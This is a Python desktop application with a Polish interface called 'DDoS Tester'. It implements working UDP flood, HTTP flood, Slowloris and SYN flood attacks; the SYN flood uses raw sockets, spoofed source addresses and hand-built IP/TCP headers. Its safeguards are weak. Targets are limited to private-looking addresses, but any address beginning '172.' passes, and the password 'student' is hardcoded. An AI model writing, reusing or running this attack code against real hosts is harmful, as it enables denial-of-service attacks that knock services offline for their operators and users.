from PyQt6.QtWidgets import (QApplication, QMainWindow, QLabel, QPushButton, 
                            QVBoxLayout, QHBoxLayout, QWidget, QLineEdit, 
                            QComboBox, QTextEdit, QSpinBox, QFormLayout,
                            QSlider, QCheckBox, QMessageBox)
from PyQt6.QtGui import QPixmap
from PyQt6.QtCore import QTimer, Qt
import sys
import threading
import socket
import time
import random
import logging
import psutil
import subprocess
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Optional
import os
import json
import csv
from pyqtgraph import PlotWidget


class KonfiguracjaAtaku:
    def __init__(self):
        self.watki = 10
        self.rozmiar_pakietu = 1024
        self.timeout = 1
        self.porty = [80, 443]
        self.bufor_pakietow = 512
        self.opoznienie = 0.1
        self.max_polaczen = 100
        self.max_cpu_percent = 50
        self.max_memory_percent = 50
        self.thread_pool_size = 5
        self.monitor_resources = True


class DDoSTester(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DDoS Tester")
        self.setGeometry(100, 100, 800, 700)
        
        self.running = False
        self.watki: List[threading.Thread] = []
        self.config = KonfiguracjaAtaku()
        self.statystyki = {
            "wyslane_pakiety": 0, 
            "bledy": 0,
            "przepustowosc": 0,
            "ostatni_pomiar": time.time(),
            "ostatnie_pakiety": 0,
            "cpu_usage": 0,
            "memory_usage": 0
        }
        
        self.thread_pool: Optional[concurrent.futures.ThreadPoolExecutor] = None
        self.resource_monitor_thread: Optional[threading.Thread] = None
        self.throttling_active = False
        
        self.max_attack_duration = 300
        self.attack_start_time = None

        self.data_x = []
        self.data_y = []

        self.konfiguruj_logi()
        self.initUI()
        
        self.timer_statusu = QTimer()
        self.timer_statusu.timeout.connect(self.aktualizuj_status)
        self.timer_statusu.start(1000)
        
    def konfiguruj_logi(self):
        logging.basicConfig(
            filename=f'ddos_tester_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def dodaj_log(self, wiadomosc, poziom="INFO"):
        czas = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        komunikat = f"[{czas}] [{poziom}] {wiadomosc}"
        
        self.log_output.append(komunikat)
        
        if poziom == "INFO":
            logging.info(wiadomosc)
        elif poziom == "WARNING":
            logging.warning(wiadomosc)
        elif poziom == "ERROR":
            logging.error(wiadomosc)

    def initUI(self):
        background_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'assets', 'stars_background.jpg')).replace("\\", "/")

        background_label = QLabel(self)
        pixmap = QPixmap(background_path)
        if pixmap.isNull():
            print("Nie udało się załadować obrazu tła!")
        else:
            background_label.setPixmap(pixmap)
            background_label.setScaledContents(True)
            background_label.setGeometry(self.rect())
            background_label.lower()

        self.background_label = background_label
        self.resizeEvent = self.on_resize

        glowny_layout = QVBoxLayout()
        glowny_layout.setSpacing(10)
        glowny_layout.setContentsMargins(20, 20, 20, 20)
        
        tytul = QLabel("DDoS Tester") 
        tytul.setStyleSheet("""
            QLabel {
                color: #4CAF50;
                font-size: 24px;
                font-weight: bold;
                padding: 10px;
                border-bottom: 2px solid #4CAF50;
                margin-bottom: 20px;
            }
        """)
        glowny_layout.addWidget(tytul)
        
        form_container = QWidget()
        form_container.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                border-radius: 10px;
                padding: 15px;
            }
        """)
        form_layout = QFormLayout()
        form_layout.setSpacing(10)
        
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("np. 192.168.1.1")
        
        self.port_label = QLabel("80")
        self.port_label.setStyleSheet("""
            QLabel {
                color: white;
                background-color: #3b3b3b;
                border: 1px solid #555;
                border-radius: 5px;
                padding: 5px;
                min-height: 25px;
            }
        """)

        self.liczba_watkow = QSpinBox()
        self.liczba_watkow.setRange(1, 10)
        self.liczba_watkow.setValue(10)
        
        self.rozmiar_pakietu = QSpinBox()
        self.rozmiar_pakietu.setRange(64, 1024)
        self.rozmiar_pakietu.setValue(1024)
        
        self.opoznienie = QSpinBox()
        self.opoznienie.setRange(10, 1000)
        self.opoznienie.setValue(100)
        
        self.max_polaczen = QSpinBox()
        self.max_polaczen.setRange(10, 100)
        self.max_polaczen.setValue(100)
        
        self.tryb_ataku = QComboBox()
        self.tryb_ataku.addItems([
            "UDP Flood", "HTTP Flood", "SYN Flood", 
            "ICMP Flood", "Slowloris", "Tryb testowy"
        ])
        
        form_layout.addRow("<b>Adres IP celu:</b>", self.ip_input)
        form_layout.addRow("<b>Port (automatyczny):</b>", self.port_label)
        form_layout.addRow("<b>Liczba wątków:</b>", self.liczba_watkow)
        form_layout.addRow("<b>Rozmiar pakietu:</b>", self.rozmiar_pakietu)
        form_layout.addRow("<b>Opóźnienie (ms):</b>", self.opoznienie)
        form_layout.addRow("<b>Max połączeń:</b>", self.max_polaczen)
        form_layout.addRow("<b>Tryb ataku:</b>", self.tryb_ataku)
        
        form_container.setLayout(form_layout)
        glowny_layout.addWidget(form_container)

        # Add a plot widget for visualizing attack statistics
        self.plot_widget = PlotWidget()
        self.plot_widget.setBackground("#1b1b1b")
        self.plot_widget.getPlotItem().setLabel("left", "Wysłane Pakiety")
        self.plot_widget.getPlotItem().setLabel("bottom", "Czas (s)")
        self.plot_widget.getPlotItem().showGrid(x=True, y=True, alpha=0.3)
        self.plot_widget.getPlotItem().setTitle("Statystyki Ataku", color="#4CAF50", size="12pt")
        glowny_layout.addWidget(self.plot_widget)

        centralny_widget = QWidget()
        centralny_widget.setLayout(glowny_layout)
        self.setCentralWidget(centralny_widget)
        
        monitor_container = QWidget()
        monitor_container.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                border-radius: 10px;
                padding: 15px;
                margin-top: 10px;
            }
        """)
        monitor_layout = QFormLayout()
        
        self.cpu_slider = QSlider(Qt.Orientation.Horizontal)
        self.cpu_slider.setRange(10, 90)
        self.cpu_slider.setValue(self.config.max_cpu_percent)
        self.cpu_slider.setTickPosition(QSlider.TickPosition.TicksBelow)
        self.cpu_slider.setTickInterval(10)
        self.cpu_slider.valueChanged.connect(self.update_cpu_limit)
        
        self.memory_slider = QSlider(Qt.Orientation.Horizontal)
        self.memory_slider.setRange(10, 90)
        self.memory_slider.setValue(self.config.max_memory_percent)
        self.memory_slider.setTickPosition(QSlider.TickPosition.TicksBelow)
        self.memory_slider.setTickInterval(10)
        self.memory_slider.valueChanged.connect(self.update_memory_limit)
        
        self.thread_pool_spinbox = QSpinBox()
        self.thread_pool_spinbox.setRange(5, 100)
        self.thread_pool_spinbox.setValue(self.config.thread_pool_size)
        self.thread_pool_spinbox.valueChanged.connect(self.update_thread_pool_size)
        
        self.monitor_checkbox = QCheckBox("Włącz monitorowanie zasobów")
        self.monitor_checkbox.setChecked(self.config.monitor_resources)
        self.monitor_checkbox.stateChanged.connect(self.toggle_resource_monitoring)
        
        slider_style = """
            QSlider {
                height: 30px;
            }
            QSlider::groove:horizontal {
                border: 1px solid #999999;
                height: 8px;
                background: #3b3b3b;
                margin: 2px 0;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #4CAF50;
                border: 1px solid #5c5c5c;
                width: 18px;
                margin: -2px 0;
                border-radius: 9px;
            }
        """
        
        self.cpu_slider.setStyleSheet(slider_style)
        self.memory_slider.setStyleSheet(slider_style)
        
        self.cpu_limit_label = QLabel(f"Limit CPU: {self.config.max_cpu_percent}%")
        self.memory_limit_label = QLabel(f"Limit pamięci: {self.config.max_memory_percent}%")
        
        monitor_layout.addRow("<b>Bezpieczeństwo systemu:</b>", self.monitor_checkbox)
        monitor_layout.addRow(self.cpu_limit_label, self.cpu_slider)
        monitor_layout.addRow(self.memory_limit_label, self.memory_slider)
        monitor_layout.addRow("<b>Rozmiar puli wątków:</b>", self.thread_pool_spinbox)
        
        monitor_container.setLayout(monitor_layout)
        glowny_layout.addWidget(monitor_container)
        
        buttons_container = QWidget()
        buttons_container.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                border-radius: 10px;
                padding: 15px;
                margin-top: 10px;
            }
        """)
        buttons_layout = QHBoxLayout()
        
        self.start_button = QPushButton("▶ Rozpocznij Atak")
        self.stop_button = QPushButton("⏹ Zatrzymaj Atak")
        
        button_style = """
            QPushButton {
                padding: 10px 20px;
                font-size: 14px;
                font-weight: bold;
                border-radius: 5px;
                min-width: 150px;
            }
            QPushButton:hover {
                opacity: 0.8;
            }
        """
        
        self.start_button.setStyleSheet(button_style + "background-color: #4CAF50; color: white;")
        self.stop_button.setStyleSheet(button_style + "background-color: #f44336; color: white;")
        
        self.start_button.clicked.connect(self.rozpocznij_atak)
        self.stop_button.clicked.connect(self.zatrzymaj_atak)
        
        buttons_layout.addWidget(self.start_button)
        buttons_layout.addWidget(self.stop_button)
        buttons_container.setLayout(buttons_layout)
        glowny_layout.addWidget(buttons_container)
        
        status_container = QWidget()
        status_container.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                border-radius: 10px;
                padding: 15px;
                margin-top: 10px;
            }
        """)
        status_layout = QVBoxLayout()
        
        self.status_label = QLabel("Status: Bezczynny")
        self.status_label.setStyleSheet("""
            QLabel {
                color: #ddd;
                font-size: 14px;
                padding: 5px;
                background-color: #3b3b3b;
                border-radius: 5px;
            }
        """)
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            QTextEdit {
                background-color: #1b1b1b;
                border: 1px solid #555;
                border-radius: 5px;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                padding: 10px;
            }
        """)
        
        status_layout.addWidget(self.status_label)
        status_layout.addWidget(self.log_output)
        status_container.setLayout(status_layout)
        glowny_layout.addWidget(status_container)
        
        centralny_widget = QWidget()
        centralny_widget.setLayout(glowny_layout)
        self.setCentralWidget(centralny_widget)

    def on_resize(self, event):
        if hasattr(self, 'background_label'):
            self.background_label.setGeometry(self.rect())
        super().resizeEvent(event)

    def update_cpu_limit(self, value):
        self.config.max_cpu_percent = value
        self.cpu_limit_label.setText(f"Limit CPU: {value}%")
        
    def update_memory_limit(self, value):
        self.config.max_memory_percent = value
        self.memory_limit_label.setText(f"Limit pamięci: {value}%")
        
    def update_thread_pool_size(self, value):
        self.config.thread_pool_size = value
        
    def toggle_resource_monitoring(self, state):
        self.config.monitor_resources = (state == Qt.CheckState.Checked.value)

    def monitor_system_resources(self):
        try:
            while self.running and self.config.monitor_resources:
                cpu_percent = psutil.cpu_percent(interval=0.5)
                memory_percent = psutil.virtual_memory().percent

                self.statystyki["cpu_usage"] = cpu_percent
                self.statystyki["memory_usage"] = memory_percent

                if cpu_percent > self.config.max_cpu_percent or memory_percent > self.config.max_memory_percent:
                    if not self.throttling_active:
                        self.throttling_active = True
                        new_delay = min(self.opoznienie.value() * 2, 1000)
                        self.opoznienie.setValue(new_delay)
                        self.dodaj_log(f"UWAGA: Ograniczam użycie zasobów! CPU: {cpu_percent}%, RAM: {memory_percent}%", "WARNING")

                    if cpu_percent > self.config.max_cpu_percent + 20 or memory_percent > self.config.max_memory_percent + 20:
                        self.dodaj_log("KRYTYCZNE użycie zasobów! Zatrzymuję atak.", "ERROR")
                        self.zatrzymaj_atak()
                        break
                else:
                    if self.throttling_active:
                        self.throttling_active = False
                        self.dodaj_log("Zasoby systemowe wróciły do bezpiecznego poziomu.", "INFO")

                time.sleep(1)
        except Exception as e:
            self.dodaj_log(f"Błąd w monitorowaniu zasobów: {e}", "ERROR")

    def rozpocznij_atak(self):
        if self.running:
            self.dodaj_log("Atak już trwa!", "WARNING")
            return

        if not self.waliduj_ip():
            return

        if not self.potwierdz_uruchomienie():
            return

        tryb = self.tryb_ataku.currentText().lower().replace(" ", "_")
        domyslne_porty = {
            "udp_flood": 53,
            "http_flood": 80,
            "syn_flood": 443,
            "icmp_flood": 0,
            "slowloris": 80
        }
        self.port_label.setText(str(domyslne_porty.get(tryb, 80)))

        self.running = True
        self.attack_start_time = time.time()
        self.statystyki = {
            "wyslane_pakiety": 0,
            "bledy": 0,
            "przepustowosc": 0,
            "ostatni_pomiar": time.time(),
            "ostatnie_pakiety": 0,
            "cpu_usage": 0,
            "memory_usage": 0
        }

        metoda_ataku = getattr(self, tryb, None)
        if metoda_ataku:
            self.thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=self.config.thread_pool_size)

            if self.config.monitor_resources:
                self.resource_monitor_thread = threading.Thread(
                    target=self.monitor_system_resources,
                    daemon=True
                )
                self.resource_monitor_thread.start()

            for _ in range(self.liczba_watkow.value()):
                self.thread_pool.submit(self.uruchom_zabezpieczony_atak, metoda_ataku, self.ip_input.text())

            self.dodaj_log(f"Rozpoczęto atak {self.tryb_ataku.currentText()} na porcie {self.port_label.text()}")
            self.dodaj_log(f"Monitorowanie zasobów: {'Włączone' if self.config.monitor_resources else 'Wyłączone'}")
        else:
            self.dodaj_log(f"Nieznany typ ataku: {tryb}", "ERROR")

    def uruchom_zabezpieczony_atak(self, metoda_ataku, ip):
        try:
            while self.running:
                if time.time() - self.attack_start_time > self.max_attack_duration:
                    self.dodaj_log("Atak został automatycznie zatrzymany po osiągnięciu limitu czasu.", "WARNING")
                    self.zatrzymaj_atak()
                    break
                metoda_ataku(ip)
        except Exception as e:
            self.dodaj_log(f"Błąd podczas wykonywania ataku: {e}", "ERROR")

    def potwierdz_uruchomienie(self):
        dialog = QMessageBox(self)
        dialog.setIcon(QMessageBox.Icon.Warning)
        dialog.setWindowTitle("Potwierdzenie")
        dialog.setText("Czy na pewno chcesz uruchomić test? Upewnij się, że testujesz w swojej lokalnej sieci.")
        dialog.setInformativeText("Wprowadź hasło, aby kontynuować:")
        dialog.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        dialog.setDefaultButton(QMessageBox.StandardButton.No)

        password_input = QLineEdit()
        password_input.setEchoMode(QLineEdit.EchoMode.Password)
        dialog.layout().addWidget(password_input)

        odpowiedz = dialog.exec()
        if odpowiedz == QMessageBox.StandardButton.Yes and password_input.text() == "student":
            return True
        else:
            self.dodaj_log("Nieprawidłowe hasło lub anulowano test.", "ERROR")
            return False

    def zatrzymaj_atak(self):
        if not self.running:
            return

        self.running = False
        self.attack_start_time = None

        if self.thread_pool:
            self.thread_pool.shutdown(wait=False)
            self.thread_pool = None

        if self.resource_monitor_thread and self.resource_monitor_thread.is_alive():
            self.resource_monitor_thread.join(timeout=1.0)
            self.resource_monitor_thread = None

        self.watki.clear()
        self.dodaj_log("Atak zatrzymany")
        
    def aktualizuj_status(self):
        if self.running:
            czas_teraz = time.time()
            czas_od_ostatniego_pomiaru = czas_teraz - self.statystyki["ostatni_pomiar"]
            wyslane_pakiety = self.statystyki["wyslane_pakiety"] - self.statystyki["ostatnie_pakiety"]
            przepustowosc = wyslane_pakiety / czas_od_ostatniego_pomiaru if czas_od_ostatniego_pomiaru > 0 else 0

            self.statystyki["przepustowosc"] = przepustowosc
            self.statystyki["ostatni_pomiar"] = czas_teraz
            self.statystyki["ostatnie_pakiety"] = self.statystyki["wyslane_pakiety"]

            self.data_x.append(czas_teraz - self.attack_start_time)
            self.data_y.append(self.statystyki["wyslane_pakiety"])
            self.plot_widget.plot(self.data_x, self.data_y, pen="#4CAF50", clear=True)

            self.status_label.setText(
                f"Status: Atak trwa | Wysłane pakiety: {self.statystyki['wyslane_pakiety']} | "
                f"Błędy: {self.statystyki['bledy']} | Przepustowość: {przepustowosc:.2f} pakietów/s | "
                f"CPU: {self.statystyki['cpu_usage']:.1f}% | RAM: {self.statystyki['memory_usage']:.1f}%"
            )
        else:
            self.status_label.setText("Status: Bezczynny")
            self.status_label.setStyleSheet("QLabel { color: #ddd; background-color: #3b3b3b; border-radius: 5px; }")

    def create_ip_header(self, source_ip, dest_ip):
        ip_header = b''
        ip_header += b'\x45'
        ip_header += b'\x00'
        ip_header += b'\x00\x28'
        ip_header += b'\xab\xcd'
        ip_header += b'\x00\x00'
        ip_header += b'\x40'
        ip_header += b'\x06'
        ip_header += b'\x00\x00'
        ip_header += socket.inet_aton(source_ip)
        ip_header += socket.inet_aton(dest_ip)
        return ip_header
    
    def create_tcp_header(self, source_ip, dest_ip, dest_port):
        tcp_header = b''
        tcp_header += random.randint(1024, 65535).to_bytes(2, 'big')
        tcp_header += dest_port.to_bytes(2, 'big')
        tcp_header += b'\x00\x00\x00\x00'
        tcp_header += b'\x00\x00\x00\x00'
        tcp_header += b'\x50\x02'
        tcp_header += b'\x71\x10'
        tcp_header += b'\x00\x00'
        tcp_header += b'\x00\x00'
        return tcp_header
    
    def udp_flood(self, ip):
        port = int(self.port_label.text())
        rozmiar_pakietu = self.rozmiar_pakietu.value()
        opoznienie = self.opoznienie.value() / 1000.0

        try:
            while self.running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pakiet = random._urandom(rozmiar_pakietu)
                sock.sendto(pakiet, (ip, port))
                self.statystyki["wyslane_pakiety"] += 1
                sock.close()
                time.sleep(opoznienie)
        except Exception as e:
            self.dodaj_log(f"Błąd podczas wczytywania konfiguracji: {e}", "ERROR")

    def http_flood(self, ip):
        port = int(self.port_label.text())
        opoznienie = self.opoznienie.value() / 1000.0

        try:
            while self.running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.timeout)
                sock.connect((ip, port))
                random_path = f"/{random.randint(1, 10000)}"
                random_agent = f"Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0) AppleWebKit/537.36"
                request = (
                    f"GET {random_path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                sock.send(request.encode())
                self.statystyki["wyslane_pakiety"] += 1
                sock.close()
                time.sleep(opoznienie)
        except Exception as e:
            self.statystyki["bledy"] += 1
            if self.statystyki["bledy"] % 100 == 0:
                self.dodaj_log(f"Błąd podczas wysyłania żądania HTTP: {e}", "ERROR")

    def tryb_testowy(self, ip):
        opoznienie = self.opoznienie.value() / 1000.0
        try:
            while self.running:
                self.statystyki["wyslane_pakiety"] += 1
                self.dodaj_log(f"Symulacja wysłania pakietu do {ip}", "INFO")
                time.sleep(opoznienie)
        except Exception as e:
            self.dodaj_log(f"Błąd w trybie testowym: {e}", "ERROR")

    def syn_flood(self, ip):
        port = int(self.port_label.text())
        opoznienie = self.opoznienie.value() / 1000.0

        try:
            while self.running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                source_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
                dest_ip = ip

                ip_header = self.create_ip_header(source_ip, dest_ip)

                tcp_header = self.create_tcp_header(source_ip, dest_ip, port)

                packet = ip_header + tcp_header

                sock.sendto(packet, (dest_ip, port))
                self.statystyki["wyslane_pakiety"] += 1
                sock.close()
                time.sleep(opoznienie)
        except Exception as e:
            self.statystyki["bledy"] += 1
            if self.statystyki["bledy"] % 100 == 0:
                self.dodaj_log(f"Błąd podczas SYN flood: {e}", "ERROR")

    def slowloris(self, ip):
        port = int(self.port_label.text())
        max_polaczen = self.max_polaczen.value()
        polaczenia = []
        opoznienie = self.opoznienie.value() / 1000.0
        try:
            while self.running:
                if len(polaczenia) < max_polaczen:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((ip, port))
                    sock.send(f"GET /?{random.randint(1, 10000)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {ip}\r\n".encode())
                    sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                    sock.send("Accept-language: pl\r\n".encode())
                    polaczenia.append(sock)
                    self.statystyki["wyslane_pakiety"] += 1
                
                for sock in list(polaczenia):
                    try:
                        sock.send(f"X-a: {random.randint(1, 10000)}\r\n".encode())
                        self.statystyki["wyslane_pakiety"] += 1
                    except:
                        polaczenia.remove(sock)
                        self.statystyki["bledy"] += 1
                time.sleep(max(opoznienie, 1))
                
                if self.statystyki["wyslane_pakiety"] % 10 == 0:
                    self.dodaj_log(f"Slowloris: {len(polaczenia)} aktywnych połączeń")
        except Exception as e:
            self.statystyki["bledy"] += 1
            
            if self.statystyki["bledy"] % 10 == 0:
                self.dodaj_log(f"Błąd podczas Slowloris: {e}", "ERROR")
        finally:
            for sock in polaczenia:
                try:
                    sock.close()
                except:
                    pass

    def waliduj_ip(self):
        ip = self.ip_input.text()
        try:
            socket.inet_aton(ip)
            if ip.startswith("127.") or ip == "0.0.0.0":
                self.dodaj_log("Adres IP nie może być adresem lokalnym (127.0.0.1 lub 0.0.0.0).", "ERROR")
                return False
            if not (ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.")):
                self.dodaj_log("Adres IP musi należeć do lokalnej sieci (192.168.x.x, 10.x.x.x, 172.x.x.x).", "ERROR")
                return False
            return True
        except socket.error:
            self.dodaj_log("Niepoprawny adres IP!", "ERROR")
            return False

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DDoSTester()
    window.show()
    sys.exit(app.exec())
